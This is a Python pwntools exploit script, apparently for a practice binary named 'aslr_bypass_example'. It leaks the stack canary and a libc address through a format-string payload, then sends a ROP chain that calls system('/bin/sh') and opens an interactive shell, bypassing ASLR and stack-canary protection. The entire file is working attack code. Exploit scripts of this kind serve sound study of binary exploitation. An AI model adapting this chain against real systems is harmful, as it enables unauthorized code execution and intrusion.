import pwn
import sys

sys.path.append('../../MyTools')
import gadgets_info
import conversion

def convert2hex(data):
	return int(data, 16)

def sh_payload_get(target_info):
	payload = b'A' * (target_info['buf2stack'] - target_info['addr_len'])
	payload += pwn.p64(target_info['canary'])
	payload += b'B' * target_info['addr_len']
	payload += pwn.p64(target_info['libc_base_addr'] + target_info['pop_rdi_ret_offset'])
	payload += pwn.p64(target_info['libc_base_addr'] + target_info['sh_offset'])
	payload += pwn.p64(target_info['libc_base_addr'] + target_info['ret_offset'])
	payload += pwn.p64(target_info['libc_base_addr'] + target_info['system_offset'])
	payload += pwn.p64(target_info['libc_base_addr'] + target_info['exit_offset'])
	return payload

def libc_info_get(target_info):
	target_info['system_offset'] = target_info['libc_info'].symbols['system']
	target_info['exit_offset'] = target_info['libc_info'].symbols['exit']
	target_info['sh_offset'] = target_info['libc_info'].search(b'/bin/sh').__next__()
	return target_info

def canary_get(target_info):
	target_info['canary'] = convert2hex(target_info['leak_data'].decode().split('.')[0])
	print('[++] receive: canary value: {}'.format(hex(target_info['canary'])))
	return target_info

def libc_base_get(target_info):
	random_libc = convert2hex(target_info['leak_data'].decode().split('.')[1])
	print('[++] receive: libc leaked address: {0}'.format(hex(random_libc)))

	target_info['libc_base_addr'] = random_libc - target_info['libc_call_main_offset']
	print('[**] libc base address: {0}'.format(hex(target_info['libc_base_addr'])))
	return target_info

def leak_payload_get():
	payload = b'%13$llx.%17$llx.'
	payload += b'endtag'
	return payload

'''
leak function:
| buffer  | canary           | caller rbp | callee return |
| padding | one byte padding | origin     | origin        |

vuln function:
| buffer  | canary      | caller rbp | callee return |
| padding | leak canary | padding    | rop chain     |
'''

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux',
)

def main():
	target_info = {
		'exec_path': './aslr_bypass_example',
		'libc_info': None,
		'buf2stack': 0x110,
		'addr_len': 0x8,
		'leak_data': None,
		'libc_call_main_offset': 0x0,
		'canary': 0x0,
		'libc_base_addr': 0x0,
		'pop_rdi_ret_offset': 0x0,
		'pop_rdi_len': 0x1,
		'ret_offset': 0x0,
		'system_offset': 0x0,
		'sh_offset': 0x0,
		'exit_offset': 0x0,
	}

	pwn.context.binary = pwn.ELF(target_info['exec_path'])
	conn = pwn.process([target_info['exec_path']])
	target_info['libc_info'] = pwn.ELF(target_info['exec_path']).libc

	print('[--] tips: may need update new offset')
	target_info['libc_call_main_offset'] = gadgets_info.linux_adm64_gadgets['libc_call_main_offset']
	target_info['pop_rdi_ret_offset'] = gadgets_info.linux_adm64_gadgets['pop_rdi_ret_offset']
	target_info['ret_offset'] = target_info['pop_rdi_ret_offset'] + target_info['pop_rdi_len']

	leak_payload = leak_payload_get()
	conn.sendlineafter(b'>>>>\n', leak_payload)

	target_info['leak_data'] = conn.recvuntil(b'endtag')
	target_info['leak_data'] = target_info['leak_data'][0:-1]

	target_info = libc_base_get(target_info)
	target_info = canary_get(target_info)
	target_info = libc_info_get(target_info)

	sh_payload = sh_payload_get(target_info)
	conn.sendlineafter(b'<<<<\n', sh_payload)
	conn.interactive()

if __name__ == '__main__':
	main()
